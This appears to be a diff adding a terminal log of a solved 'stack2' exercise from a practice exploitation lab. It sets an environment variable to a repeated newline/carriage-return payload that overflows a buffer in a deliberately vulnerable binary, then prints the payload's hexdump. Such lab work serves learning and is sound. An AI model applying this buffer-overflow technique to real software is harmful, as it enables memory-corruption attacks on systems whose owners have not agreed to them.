@@ -1,0 +1,10 @@
+tao@xhost: /DATA/linux-dowloads/pwn/bin
+$ export GREENIE="$(python -c 'print "\n\r\n\r"*17')"
+tao@xhost: /DATA/linux-dowloads/pwn/bin
+$ ./stack2
+you have correctly modified the variable
+tao@xhost: /DATA/linux-dowloads/pwn/bin
+$ echo "$GREENIE" |hd 
+00000000  0a 0d 0a 0d 0a 0d 0a 0d  0a 0d 0a 0d 0a 0d 0a 0d  |................|
+*
+00000045
